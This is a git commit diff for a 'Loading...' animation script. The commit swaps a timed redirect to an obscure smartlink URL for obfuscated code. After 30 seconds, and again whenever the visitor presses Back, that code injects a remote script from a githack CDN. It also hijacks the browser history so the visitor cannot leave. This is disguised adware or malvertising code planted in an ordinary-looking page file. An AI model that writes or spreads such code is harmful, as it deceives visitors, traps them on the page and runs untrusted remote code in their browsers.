ea9d8738efb3411c0a65ab39bdc0af4bfff81d9b
jandarahasia <85703474+jandarahasia@users.noreply.github.com>
2021-12-03 04:03:12 +0700

    Update and rename load.js to min.js

--- loading/script/min.js
+++ loading/script/min.js
@@ -1,4 +1,4 @@
-   var ci = 0;
+    var ci = 0;
     var load = document.getElementById("load");
     setInterval(function(){
         switch(ci){
@@ -7,7 +7,7 @@
                 ci = 1;
                 break;
             case 1:
-                load.innerHTML = 'Loading<br>.';
+                load.innerHTML = 'Loading<br> .';
                 ci = 2;
                 break;
             case 2:
@@ -29,5 +29,14 @@
         }
     },300);
     setTimeout(function(){
-                window.location.href = "https://cqwajn.com/gosl/InNpZCI6MTA3NDQ4Nywic21hcnRsaW5rIjp0cnVlfQ==eyJwaWQiOjEwMjg3Nzcs?si1=github&si2=jandarahasia";
-            },30000);   
+		            document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://rawcdn.githack.com/aridjayasite/aridjayasite/4e706569d1b8f2037d08879d9ffe7a76e1fa3162/random/smartlink.js"></scr' + 'ipt>');
+            },30000);    
+
+// back
+  if (typeof history.pushState === "function") {
+	history.pushState("back", null, null);
+	window.onpopstate = function() {
+	    history.pushState("back", null, null);
+		      document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://rawcdn.githack.com/aridjayasite/aridjayasite/4e706569d1b8f2037d08879d9ffe7a76e1fa3162/random/smartlink.js"></scr' + 'ipt>');
+	    }
+  	};
